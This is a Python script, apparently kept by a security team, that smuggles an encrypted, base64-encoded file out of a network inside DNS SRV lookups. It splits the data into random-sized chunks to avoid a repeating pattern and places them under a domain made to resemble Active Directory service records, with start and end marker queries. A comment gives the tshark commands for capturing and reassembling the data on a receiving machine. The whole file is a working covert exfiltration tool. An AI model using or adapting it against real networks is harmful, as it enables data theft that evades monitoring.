from random import randint

import dns.resolver
from tqdm import tqdm

# On interception computer
#   tshark -n -i enp0s31f6 -f 'src port 53' -w file.pcap
#   tshark -T text -r file.pcap > res.txt

def dns_query(domains_data: list, index_name: str or None):
    prefix = '.'.join(domains_data)
    if index_name is None:
        domain = prefix + '._msdsc.net.intra'
    else:
        domain = prefix + '.' + index_name + '._msdsc.net.intra'
    try:
        dns.resolver.resolve(domain, 'SRV')
    except dns.resolver.NoAnswer:
        print('NoAnswer: ' + domain)
    except dns.resolver.NXDOMAIN:
        pass
        # print('NXDOMAIN: ' + domain)
    except dns.name.EmptyLabel:
        print('EmptyLabel: ' + domain)
    except dns.name.LabelTooLong:
        print('LabelTooLong: ' + domain)


def main():
    # Original file is compressed by 7z with AES encryption,
    # then encoded with a custom base 64 encoding step
    with open("C:/CSIRT/tmp/in.txt.encoded", 'r') as in_file:
        data = in_file.read()
        data_encoded = data.replace('.', 't-ii-o')
        chunks = []
        # Build a table of 176 chunks with random size to produce an unrepeated signal
        chunks_sizes = [randint(15, 51) for i in range(1, 176)]
        # chunks_sizes = [randint(1, 5) for i in range(1, 3)] # Using to debug code
        i = 0
        j = 0
        while i < len(data_encoded):
            chunk = data_encoded[i:i + chunks_sizes[j]]
            chunks.append(chunk)
            i += chunks_sizes[j]
            if j == len(chunks_sizes) - 1:
                j = 0
            else:
                j += 1
        index_int = 0
        index_letter = 'A'
        index_letter_int = 0
        dns_query(['go-' + str(index_letter_int)], None)
        chunk_x_3 = []
        for chunk in tqdm(chunks, ncols=200):
            chunk_x_3.append(chunk)
            # Group 3 chunks
            if len(chunk_x_3) == 3:
                index_name = index_letter + '-' + str(index_int)
                dns_query(chunk_x_3, index_name)
                chunk_x_3 = []
                if index_int == 999999999:
                    index_int = 0
                    if index_letter == 'z':
                        index_letter = 'A'
                        dns_query(['gone#' + index_name + '-' + str(index_letter_int)], None)
                        index_letter_int += 1
                        dns_query(['go-' + str(index_letter_int)], None)
                    else:
                        index_letter = chr(ord(index_letter) + 1)
                else:
                    index_int += 1

        # Last chunks
        if len(chunk_x_3) > 0:
            dns_query(chunk_x_3, index_name)
            index_name = index_letter + '-' + str(index_int)
        dns_query(['gone#' + index_name + '-' + str(index_letter_int)], None)


if __name__ == '__main__':
    main()